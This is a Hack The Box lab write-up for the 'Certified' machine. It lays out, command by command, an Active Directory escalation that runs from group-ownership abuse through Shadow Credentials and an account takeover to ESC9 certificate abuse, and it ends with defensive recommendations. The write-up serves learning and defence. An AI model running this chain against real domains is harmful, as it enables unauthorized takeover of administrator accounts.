---
title: "Certified: Escalating an Active Directory ACL Chain Through ESC9"
description: "Group and account-control permissions form an ACL chain ending in AD CS ESC9 certificate abuse."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
---

## Summary

Certified is an HTB Active Directory lab. Recorded low-privilege access exposed a sequence of group and account-control permissions that led to AD CS ESC9 abuse. Target identifiers, credentials, hashes, certificate material, flags, and SIDs are redacted.

## Context and Objective

The service inventory included DNS, Kerberos, LDAP, SMB, and WinRM. BloodHound data in the notes identified this chain: a low-privileged user could take ownership of `Management`, join it, use its `GenericWrite` over a service account for Shadow Credentials, then use that account's `GenericAll` over a certificate-operator account. The final account could enroll through a template vulnerable to ESC9.

## Approach and Evidence

### Enumerate domain services and ACL path

The recorded scan identified standard domain-controller services and WinRM. The notes then collected directory relationship data using the provided low-privilege account.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
rusthound-ce -u '<INITIAL_USER>' -p '<INITIAL_PASSWORD>' \
  --domain <DOMAIN> -c All -z -o certified
```

```text
53/tcp: DNS
88/tcp: Kerberos
389/tcp: LDAP
445/tcp: SMB
5985/tcp: WinRM
```

```text
<INITIAL_USER>
  -> WriteOwner on Management
  -> Management has GenericWrite on <SERVICE_ACCOUNT>
  -> <SERVICE_ACCOUNT> has GenericAll over <CA_OPERATOR>
  -> <CA_OPERATOR> can enroll in an ESC9 template
```

### Convert group ownership into service-account control

The notes show ownership of `Management` being changed, membership-write permission assigned, and the initial user added to that group. Since the group had `GenericWrite` over the service account, a Shadow Credentials key credential was then added and used to obtain authentication material.

```bash
impacket-owneredit -dc-ip <TARGET_IP> -action write \
  -new-owner '<INITIAL_USER>' -target-sid '<MANAGEMENT_SID>' \
  '<DOMAIN>/<INITIAL_USER>:<INITIAL_PASSWORD>'

impacket-dacledit -action write -rights WriteMembers \
  -principal '<INITIAL_USER>' -target-dn '<MANAGEMENT_DN>' \
  '<DOMAIN>/<INITIAL_USER>:<INITIAL_PASSWORD>'

bloodyAD --host <TARGET_IP> -d <DOMAIN> \
  -u '<INITIAL_USER>' -p '<INITIAL_PASSWORD>' \
  add groupMember 'Management' '<INITIAL_USER>'
```

```text
OwnerSid modified successfully
... user added to Management ...
```

```bash
python3 pywhisker.py -d <DOMAIN> -u '<INITIAL_USER>' \
  -p '<INITIAL_PASSWORD>' --target '<SERVICE_ACCOUNT>' --action add
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' \
  <DOMAIN>/<SERVICE_ACCOUNT> <CCACHE_FILE>
```

```text
... certificate and key saved ...
... ticket obtained for service account ...
```

The notes report recovery of authentication material for the service account and user-level WinRM access. Exact credential material is excluded.

### Reset operator account and identify ESC9

The service account's `GenericAll` over the certificate-operator account allowed a password reset. The notes then used the operator account to enumerate vulnerable certificate templates and identified a template without the required security extension, reported as ESC9.

```bash
bloodyAD --host <TARGET_IP> -d <DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_AUTH>' \
  set password '<CA_OPERATOR>' '<NEW_OPERATOR_PASSWORD>'

certipy-ad find -vulnerable -u '<CA_OPERATOR>' \
  -p '<NEW_OPERATOR_PASSWORD>' -dc-ip <TARGET_IP>
```

```text
Password changed successfully
Template Name: <VULNERABLE_TEMPLATE>
Vulnerability: ESC9 - Template has no security extension
```

### Use ESC9 certificate enrollment

The notes changed the operator account UPN to the administrative identity, requested a certificate through the vulnerable template, restored the original UPN, and authenticated with the resulting certificate. This represented a temporary account-identity change, not a permanent remediation action.

```bash
certipy-ad account update -username <SERVICE_ACCOUNT>@<DOMAIN> \
  -hashes '<SERVICE_ACCOUNT_HASH>' -user <CA_OPERATOR> \
  -upn <ADMINISTRATOR_UPN>

certipy-ad req -username <CA_OPERATOR>@<DOMAIN> \
  -p '<NEW_OPERATOR_PASSWORD>' -dc-ip <TARGET_IP> \
  -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>'

certipy-ad account update -username <SERVICE_ACCOUNT>@<DOMAIN> \
  -hashes '<SERVICE_ACCOUNT_HASH>' -user <CA_OPERATOR> \
  -upn <CA_OPERATOR>@<DOMAIN>
```

```text
... certificate and private key written ...
... administrator authentication material obtained ...
```

The notes report administrative WinRM access after certificate authentication.

## Outcome

The recorded evidence establishes an escalation from delegated group ownership through `GenericWrite`, Shadow Credentials, `GenericAll`, and an ESC9-vulnerable certificate template. Credentials, hashes, certificates, target names, and flag values are intentionally omitted.

## Lessons and Recommendations

- Review ownership and DACL delegation on privileged groups; `WriteOwner` can enable broader rights changes.
- Monitor and restrict additions of key credentials to user and computer accounts.
- Limit `GenericWrite` and `GenericAll` permissions, especially on service and certificate-operator accounts.
- Correct AD CS template configurations that permit ESC9 and audit UPN changes around certificate enrollment.

## References

- Hack The Box, [Certified](https://app.hackthebox.com/machines/Certified) lab.
- AD CS ESC9.
